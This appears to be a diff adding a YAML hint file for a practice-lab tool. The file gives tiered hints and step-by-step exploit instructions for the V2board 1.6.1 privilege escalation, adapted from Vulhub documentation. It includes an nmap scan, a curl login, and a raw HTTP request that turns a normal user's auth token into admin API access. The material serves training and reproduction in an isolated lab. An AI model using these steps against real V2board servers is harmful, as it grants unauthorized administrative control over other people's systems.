@@ -1,0 +1,122 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: v2board/1.6-privilege-escalation
+hint_levels:
+  low:
+  - Inspect the v2board service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 8080. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): web: 8080/tcp → container 80/tcp. These are recipe defaults;
+    use the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}:8080/api/v1/admin/user/fetch`.'
+  high:
+  - 'Vulnerability: V2board 1.6.1 Privilege Escalation.'
+  - Send the raw request examples with an HTTP client that recalculates Content-Length after target and payload
+    substitutions.
+  - |-
+    Exploit
+
+    First of all, you have to register a normal user.
+
+    Then, replace the email and password with your own data and login:
+
+    ```
+    curl -i -s -k -XPOST --data-binary "email=example%40example.com&password=a123123123" http://{{NODE_IP}}:8080/api/v1/passport/auth/login
+    ```
+
+    The server will response a "auth_data" to you:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/v2board/1.6-privilege-escalation/1.png
+
+    Copy it and end the following request with your "auth_data":
+
+    ```
+    GET /api/v1/user/info HTTP/1.1
+    Host: {{NODE_IP}}:8080
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Accept-Language: en-US;q=0.9,en;q=0.8
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
+    Connection: close
+    Authorization: ZXhhbXBsZUBleGFtcGxlLmNvbTokMnkkMTAkMVJpUFplR2RnZlFPSVRyWEM4dW0udW5QZVZNTGs3RlFFbkFVVnBwbEhmTlMyczdQaEpTa3E=
+    Cache-Control: max-age=0
+
+
+    ```
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/v2board/1.6-privilege-escalation/2.png
+
+    This step is to let server save your authorization to Redis cache.
+
+    Finally, you are able to simply call all admin API with this authorization, for example `http://{{NODE_IP}}:8080/api/v1/admin/user/fetch`:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/v2board/1.6-privilege-escalation/3.png
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/v2board/1.6-privilege-escalation/README.md'
+  - |-
+    Additional public references:
+    - https://github.com/v2board/v2board/commit/5976bcc65a61f7942ed4074b9274236d9d55d5f0
+access_instructions:
+  title: V2board 1.6.1 Privilege Escalation
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 8080. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): web: 8080/tcp → container 80/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}:8080/api/v1/admin/user/fetch`.
+  - title: Exploit
+    instructions: |-
+      First of all, you have to register a normal user.
+
+      Then, replace the email and password with your own data and login:
+
+      ```
+      curl -i -s -k -XPOST --data-binary "email=example%40example.com&password=a123123123" http://{{NODE_IP}}:8080/api/v1/passport/auth/login
+      ```
+
+      The server will response a "auth_data" to you:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/v2board/1.6-privilege-escalation/1.png
+
+      Copy it and end the following request with your "auth_data":
+
+      ```
+      GET /api/v1/user/info HTTP/1.1
+      Host: {{NODE_IP}}:8080
+      Accept-Encoding: gzip, deflate
+      Accept: */*
+      Accept-Language: en-US;q=0.9,en;q=0.8
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
+      Connection: close
+      Authorization: ZXhhbXBsZUBleGFtcGxlLmNvbTokMnkkMTAkMVJpUFplR2RnZlFPSVRyWEM4dW0udW5QZVZNTGs3RlFFbkFVVnBwbEhmTlMyczdQaEpTa3E=
+      Cache-Control: max-age=0
+
+
+      ```
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/v2board/1.6-privilege-escalation/2.png
+
+      This step is to let server save your authorization to Redis cache.
+
+      Finally, you are able to simply call all admin API with this authorization, for example `http://{{NODE_IP}}:8080/api/v1/admin/user/fetch`:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/v2board/1.6-privilege-escalation/3.png
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/v2board/1.6-privilege-escalation/README.md
+  readme_sha256: 011a9cac65aa30bcb6a297c137277c583d404957edd177728d4e920428854ecc
+  compose_sha256: 7e6b2ab53fb73e4722a2bfbd09f142d82329f53bb6e681ed11efe1d48bab7501
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
